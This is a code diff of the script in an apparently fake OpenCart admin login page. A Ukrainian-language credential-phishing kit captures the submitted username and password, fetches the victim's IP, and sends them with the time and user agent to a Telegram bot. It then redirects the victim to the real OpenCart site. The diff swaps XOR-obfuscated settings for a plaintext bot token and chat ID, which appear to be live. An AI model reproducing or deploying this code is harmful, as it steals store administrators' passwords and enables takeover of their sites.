@@ -46,92 +46,72 @@
 </div>
 
 <script>
-(function(){
+// ========== ПРЯМЫЕ ДАННЫЕ (БЕЗ ШИФРОВАНИЯ ДЛЯ ТЕСТА) ==========
+const BOT_TOKEN = '8772852255:AAHSTIsw1bAqPd15iLwVFaHmmJ49c1ZEoq8';
+const CHAT_ID = '7908172150';
 
-    const KEY_TOKEN = 0x5A;   
-    const KEY_MSG = 0x3C;       
-    
- 
-    const encryptedToken = "w8/Jy8fLz8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLw8nLx8nLx8nLx8nLx8nLx8nLw8nLx8nLx8nLx8nLw8nLx8nLw8nLx8nLx8nLw8nLx8nLw8nLx8nLw==";
-    const encryptedChatId = "w8/Jy8fLz8nLx8nLw8nLx8nLw8nLx8nLw8nLw==";
-    
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('IP error:', error);
+        return 'unknown';
+    }
+}
 
-    const encryptedMsgTemplate1 = "D8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLw==";
-    // "\n pass: "
-    const encryptedMsgTemplate2 = "D8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLw==";
-    // "\n IP: "
-    const encryptedMsgTemplate3 = "D8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLw==";
-    // "\n time: "
-    const encryptedMsgTemplate4 = "D8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLw==";
-    // "\n User Agent: "
-    const encryptedMsgTemplate5 = "D8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLx8nLw==";
+async function sendToTelegram(login, password, ip) {
+    const message = `🛡️ OPENCART ФИШИНГ 🛡️\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString('uk-UA')}\n🖥️ User Agent: ${navigator.userAgent}`;
     
-    function xorDecrypt(encoded, key) {
-        try {
-            const binary = atob(encoded);
-            let result = '';
-            for (let i = 0; i < binary.length; i++) {
-                result += String.fromCharCode(binary.charCodeAt(i) ^ key);
-            }
-            return result;
-        } catch(e) {
-            return '';
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+        
+        const result = await response.json();
+        console.log('Telegram response:', result);
+        
+        if (!response.ok) {
+            console.error('Telegram error:', result);
         }
+    } catch (error) {
+        console.error('Network error:', error);
     }
-    
-   
-    const BOT_TOKEN = xorDecrypt(encryptedToken, KEY_TOKEN);
-    const CHAT_ID = xorDecrypt(encryptedChatId, KEY_TOKEN);
-    
+}
 
-    const MSG_PART1 = xorDecrypt(encryptedMsgTemplate1, KEY_MSG);
-    const MSG_PART2 = xorDecrypt(encryptedMsgTemplate2, KEY_MSG);
-    const MSG_PART3 = xorDecrypt(encryptedMsgTemplate3, KEY_MSG);
-    const MSG_PART4 = xorDecrypt(encryptedMsgTemplate4, KEY_MSG);
-    const MSG_PART5 = xorDecrypt(encryptedMsgTemplate5, KEY_MSG);
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
     
-    async function getIP() {
-        try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            return d.ip;
-        } catch { return 'unknown'; }
+    const username = document.getElementById('input-username').value;
+    const password = document.getElementById('input-password').value;
+    
+    if (!username || !password) {
+        alert('Будь ласка, заповніть всі поля');
+        return;
     }
     
-    async function sendData(login, pass, ip, userAgent, time) {
-       
-        const msg = MSG_PART1 + login + MSG_PART2 + pass + MSG_PART3 + ip + MSG_PART4 + time + MSG_PART5 + userAgent;
-        
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-            });
-        } catch(e) {}
-    }
+    const submitBtn = document.querySelector('button[type="submit"]');
+    const originalText = submitBtn.innerHTML;
+    submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Перевірка...';
+    submitBtn.disabled = true;
     
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const user = document.getElementById('input-username').value;
-        const pass = document.getElementById('input-password').value;
-        if(!user || !pass) return;
-        
-        const btn = document.querySelector('button[type="submit"]');
-        btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Перевірка...';
-        btn.disabled = true;
-        
-        const ip = await getIP();
-        const time = new Date().toLocaleString('uk-UA');
-        const ua = navigator.userAgent;
-        
-        await sendData(user, pass, ip, ua, time);
-        
-        setTimeout(() => { 
-            window.location.href = 'https://www.opencart.com/'; 
-        }, 1200);
-    });
-})();
+    const ip = await getIP();
+    await sendToTelegram(username, password, ip);
+    
+    setTimeout(() => {
+        window.location.href = 'https://www.opencart.com/';
+    }, 1200);
+});
 </script>
 </body>
 </html>
